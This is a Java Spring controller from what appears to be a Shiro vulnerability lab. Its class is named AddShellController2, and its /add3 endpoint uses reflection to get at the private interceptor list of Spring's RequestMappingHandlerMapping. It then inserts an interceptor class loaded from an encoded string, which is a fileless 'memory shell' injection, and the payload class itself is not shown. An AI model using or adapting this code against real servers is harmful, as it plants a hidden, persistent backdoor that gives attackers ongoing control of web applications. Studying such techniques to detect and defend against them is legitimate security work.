package com.shiro.vuln.Controller;

import com.shiro.vuln.util.ClassUtil;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;

@Controller
public class AddShellController2 {
    @RequestMapping(value = "/add3")
    public void add(HttpServletRequest request, HttpServletResponse response){
        try {
            // 从当前request属性中获取org.springframework.web.servlet.DispatcherServlet.CONTEXT, 其中对应的值为 AnnotationConfigServletWebServerApplicationContext
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);

            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);

            Field field = org.springframework.web.servlet.handler.AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
            field.setAccessible(true);

            ArrayList<Object> adaptedInterceptors = (ArrayList<Object>)field.get(r);
            adaptedInterceptors.add(ClassUtil.getClass(ClassUtil.INTERCEPTOR_STRING).newInstance());

            response.getWriter().println("spring Interceptors added");
        }catch (Exception e){
            e.printStackTrace();
        }

    }
}
